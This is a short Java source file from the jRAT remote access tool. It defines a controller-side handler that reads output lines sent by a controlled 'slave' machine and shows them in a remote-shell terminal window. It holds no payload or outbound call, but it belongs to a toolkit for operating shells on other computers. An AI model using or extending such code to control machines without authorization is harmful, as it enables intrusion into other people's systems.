package jrat.controller.packets.incoming;

import jrat.controller.Slave;
import jrat.controller.ui.frames.FrameRemoteShell;


public class Packet21RemoteShell extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String command = slave.readLine();
		
		FrameRemoteShell frame = FrameRemoteShell.INSTANCES.get(slave);
		
		if (frame != null) {
			frame.getTerminal().append(command + "\n");
		}

	}

}
